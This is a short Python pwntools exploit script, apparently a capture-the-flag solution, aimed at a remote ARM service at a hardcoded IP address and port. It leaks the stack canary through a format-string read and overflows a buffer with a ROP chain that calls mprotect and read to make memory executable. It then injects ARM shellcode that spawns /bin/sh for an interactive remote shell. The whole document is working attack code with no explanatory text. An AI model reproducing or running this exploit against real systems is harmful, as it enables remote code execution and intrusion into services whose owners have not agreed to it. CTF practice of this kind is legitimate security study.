from pwn import *

r = remote("165.227.98.55", 7777)

pop_r0 = 0x00070068
pop_r1 = 0x00070590
pop_r1_r2 = 0x0006f9b0
bss = 0x0009A000
mprotect = 0x0005B3AC
read = 0x0001B668
shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

r.sendlineafter("CHECK> ", "%517$x")
canary = int(r.recvuntil("I need", drop=True), 16)
log.info("canary : " + hex(canary))

payload = 'A' * 0x400
payload += p32(canary)
payload += 'A' * 0xc
payload += p32(pop_r0)
payload += p32(bss)
payload += p32(pop_r1_r2)
payload += p32(0)
payload += p32(7)
payload += p32(pop_r1)
payload += p32(0x1000)
payload += p32(mprotect)
payload += p32(0)
payload += p32(pop_r0)
payload += p32(0)
payload += p32(pop_r1_r2)
payload += p32(0)
payload += p32(0x100)
payload += p32(pop_r1)
payload += p32(bss)
payload += p32(read)
payload += p32(0)
payload += p32(bss)

r.sendlineafter("FIGHT> ", payload)
sleep(0.5)
r.sendline(shellcode)

r.interactive()
